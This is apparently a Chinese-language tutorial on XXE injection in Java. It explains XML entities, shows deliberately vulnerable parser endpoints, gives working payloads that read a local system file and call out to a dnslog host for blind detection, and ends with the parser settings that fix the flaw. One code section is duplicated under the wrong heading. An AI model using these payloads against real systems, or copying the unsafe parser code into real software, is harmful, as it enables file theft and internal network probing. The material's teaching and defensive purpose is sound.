简单来说，XXE就是XML外部实体注入。当允许引用外部实体 时，通过构造恶意内容，就可能导致任意文件读取、系统命令执 行、内网端口探测、攻击内网网站等危害。

XXE支持sun.net.www.protocol 里的所有协议：http，https， file，ftp，mailto，jar，netdoc。一般利用file协议读取文件，利用 http协议探测内网，没有回显时可组合利用file协议和ftp协议来读取文件。

# XXE相关基础概念

### XML&DTD

XML （可扩展标记语言，EXtensible Markup Language），是一 种标记语言，用来传输和存储数据，而非显示数据。

DTD（文档类型定义，Document Type Definition）的作用是定义 XML 文档的合法构建模块。它使用一系列的合法元素来定义文档结构

### 实体ENTITY

XML中的实体类型，一般有下面几种：字符实体、命名实体（或内部实体）、外部普通实体、外部参数实体。

除外部参数实体外，其它实体都以字符（&）开始，以字符（;）结束。

### 1)字符实体

字符实体类似 html 中的实体编码，形如：a（十进制）或者a（十 六进制）。

### 2)命名实体（内部实体）

内部实体又称为命名实体。

命名实体可以说成是变量声明，命名实 体只能声明在DTD或者XML文件开始部分（语句 中）。 命名实体（或内部实体）语法：

    <!ENTITY 实体名称 "实体的值">
    

如

    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE root [
        <!ENTITY x "First Param!">
        <!ENTITY y "Second Param!">
    ]>
    <root>
        <x>&x;</x>
        <y>&y;</y>
    </root>
    

定义一个实体名称x 值为First Param! &x; 引用实体x

### 3)外部普通实体

外部实体用于加载外部文件的内容。（显式XXE攻击主要利用外部 普通实体） 外部普通实体语法：

    <!ENTITY 实体名称 SYSTEM "URI/URL">
    

如

    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPe root [
        <!ENTITY outfile SYSTEM "outfile.xml">
    ]>
    <root>
        <outfile>&outfile;</outfile>
    </root>
    

### 4)外部参数实体

参数实体用于DTD和文档的内部子集中。与一般实体不同，是以字 符（%）开始，以字符（;）结束。

只有在DTD文件中才能在参数实 体声明的时候引用其他实体。（Blind XXE攻击常利用参数实体进行 数据回显）

    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE root [
        <!ENTITY % param1 "Hello">
        <!ENTITY % param2 " ">
        <!ENTITY % param3 "World">
        <!ENTITY dtd SYSTEM "combine.dtd">
        %dtd;
    ]>
    <root><foo>&content</foo></root>
    

combine.dtd中的内容 为：

    <!ENTITY content "%param1;%param2;%param3;">
    

上面combine.dtd中定义了一个基本实体，引用了3个参数实体： %param1;，%param2;，%param3;。 解析后...中的内容为Hello World。

# 漏洞代码

从request中获取到内容后直接使用parse将其进行执行，期间并未 禁止解析外部实体类

## xmlReader

无回显

    @PostMapping("/xmlReader/vuln")
    public String xmlReaderVuln(HttpServletRequest
    request) {
        try {
            String body =
    WebUtils.getRequestBody(request);
            logger.info(body);
            XMLReader xmlReader =
    XMLReaderFactory.createXMLReader();
            xmlReader.parse(new InputSource(new
    StringReader(body)));  // parse xml
            return "xmlReader xxe vuln code";
       } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
       }
    }
    

## SAXBuilder

无回显，借助dnslog查看回显内容

    @PostMapping("/xmlReader/vuln")
    public String xmlReaderVuln(HttpServletRequest
    request) {
        try {
            String body =
    WebUtils.getRequestBody(request);
            logger.info(body);
            XMLReader xmlReader =
    XMLReaderFactory.createXMLReader();
            xmlReader.parse(new InputSource(new
    StringReader(body)));  // parse xml
            return "xmlReader xxe vuln code";
       } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
       }
    }
    

## SAXBuilder

无回显，借助dnslog查看回显内容

    @RequestMapping(value = "/SAXBuilder/vuln", method = RequestMethod.POST)
        public String SAXBuilderVuln(HttpServletRequest request) {
            try {
                String body = WebUtils.getRequestBody(request);
                logger.info(body);
    
                SAXBuilder builder = new SAXBuilder();
                // org.jdom2.Document document
                builder.build(new InputSource(new StringReader(body)));  // cause xxe
                return "SAXBuilder xxe vuln code";
            } catch (Exception e) {
                logger.error(e.toString());
                return EXCEPT;
            }
        }
    

## SAXReader

saxReader是第三方的库，该类是无回显的

    ////saxReader是第三方的库，该类是无回显的
        @RequestMapping(value = "/SAXReader/vuln", method = RequestMethod.POST)
        public String SAXReaderVuln(HttpServletRequest request) {
            try {
                String body = WebUtils.getRequestBody(request);
                logger.info(body);
    
                SAXReader reader = new SAXReader();
                // org.dom4j.Document document
                reader.read(new InputSource(new StringReader(body))); // cause xxe
    
            } catch (Exception e) {
                logger.error(e.toString());
                return EXCEPT;
            }
    
            return "SAXReader xxe vuln code";
        }
    

## SAXParser

SAXParser该类也是JDK内置的类，但他不可回显内容，可借助 dnslog平台

    //该类也是JDK内置的类，但他不可回显内容，可借助dnslog平台
        @RequestMapping(value = "/SAXParser/vuln", method = RequestMethod.POST)
        public String SAXParserVuln(HttpServletRequest request) {
            try {
                String body = WebUtils.getRequestBody(request);
                logger.info(body);
    
                SAXParserFactory spf = SAXParserFactory.newInstance();
                SAXParser parser = spf.newSAXParser();
                parser.parse(new InputSource(new StringReader(body)), new DefaultHandler());  // parse xml
    
                return "SAXParser xxe vuln code";
            } catch (Exception e) {
                logger.error(e.toString());
                return EXCEPT;
            }
        }
    

## Digester

无回显

    @RequestMapping(value = "/Digester/vuln", method = RequestMethod.POST)
        public String DigesterVuln(HttpServletRequest request) {
            try {
                String body = WebUtils.getRequestBody(request);
                logger.info(body);
    
                Digester digester = new Digester();
                digester.parse(new StringReader(body));  // parse xml
            } catch (Exception e) {
                logger.error(e.toString());
                return EXCEPT;
            }
            return "Digester xxe vuln code";
        }
    

## DocumentBuilder

DocumentBuilder有回显

    // 有回显
        @RequestMapping(value = "/DocumentBuilder/vuln01", method = RequestMethod.POST)
        public String DocumentBuilderVuln01(HttpServletRequest request) {
            try {
                String body = WebUtils.getRequestBody(request);
                logger.info(body);
                DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
                DocumentBuilder db = dbf.newDocumentBuilder();
                StringReader sr = new StringReader(body);
                InputSource is = new InputSource(sr);
                Document document = db.parse(is);  // parse xml
    
                // 遍历xml节点name和value
                StringBuilder buf = new StringBuilder();
                NodeList rootNodeList = document.getChildNodes();
                for (int i = 0; i < rootNodeList.getLength(); i++) {
                    Node rootNode = rootNodeList.item(i);
                    NodeList child = rootNode.getChildNodes();
                    for (int j = 0; j < child.getLength(); j++) {
                        Node node = child.item(j);
                        buf.append(String.format("%s: %s\n", node.getNodeName(), node.getTextContent()));
                    }
                }
                sr.close();
                return buf.toString();
            } catch (Exception e) {
                logger.error(e.toString());
                return EXCEPT;
            }
        }
    

有回显-
payload：


```
    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE creds [
    <!ENTITY goodies SYSTEM
    "file:///c:/windows/system.ini"> ]>
    <creds>&goodies;</creds>
    
```


![图片.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20220904%2F1662280031_6314615f48eca3e5b6e64.png%21small)

# 修复方法

    DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
    dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
    dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
    

# 补充

### DNSlog

DNSlog就是存储在DNS服务器上的域名信息，它 记录着用户对域名www.baidu.com等的访问信息，类似日志文件 ；针对前面五种无法回显的方法，可以使用deslog来证明其是否存在 盲xxe

dnslog通常用在哪个地方

    1.SQL盲注
    2.无回显的XSS
    3.无回显的命令执行
    4.无回显的SSRF
    5.Blind XXE
    

payload


```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ANY 
[<!ENTITY xxe SYSTEM "http://obfz0y.dnslog.cn" >]
>
   <value>&xxe;</value>
```

    

![图片.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20220904%2F1662280107_631461ab95083d387cefc.png%21small)